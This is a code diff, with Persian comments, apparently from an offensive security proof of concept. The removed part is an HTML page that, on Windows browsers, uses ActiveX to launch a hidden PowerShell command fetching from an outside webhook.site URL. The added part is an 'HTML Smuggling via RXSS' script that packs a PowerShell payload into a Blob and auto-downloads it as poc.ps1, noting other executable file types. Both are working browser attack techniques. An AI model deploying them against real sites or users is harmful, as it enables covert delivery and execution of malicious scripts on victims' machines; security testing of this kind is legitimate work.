@@ -1,34 +1,18 @@
-<!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"></head>
-<body>
+const payload = `
+Write-Output "PoC for HTML Smuggling via RXSS";
+`;
 
-<script>
-if (/Win/i.test(navigator.userAgent)) {
+// ساخت Blob
+const blob = new Blob([payload], { type: "application/octet-stream" });
 
-    setTimeout(() => {
+// ساخت URL
+const url = URL.createObjectURL(blob);
 
-        // HTML صفحه‌ای که قرار است با data: URL بارگذاری شود
-        const html = `
-            <script>
-            try {
-                var shell = new ActiveXObject("WScript.Shell");
-                shell.Run("powershell -nop -w hidden -c \"$null=(New-Object Net.WebClient).DownloadString('https://webhook.site/caf8f897-4396-4d09-b589-659fde39630d?ps-ok=1')\"");
-            } catch(e) {
-                // ActiveX fail
-            }
-            </` + `script>
-        `;
+// ساخت لینک دانلود
+const a = document.createElement("a");
+a.href = url;
+a.download = "poc.ps1";   // نوع فایل: ps1, reg, bat, lnk, js
+document.body.appendChild(a);
 
-        // ساخت data URL
-        const data = "data:text/html," + encodeURIComponent(html);
-
-        // بارگذاری
-        location = data;
-
-    }, 1500);
-}
-</script>
-
-</body>
-</html>
+// اجرای دانلود اتومات
+a.click();
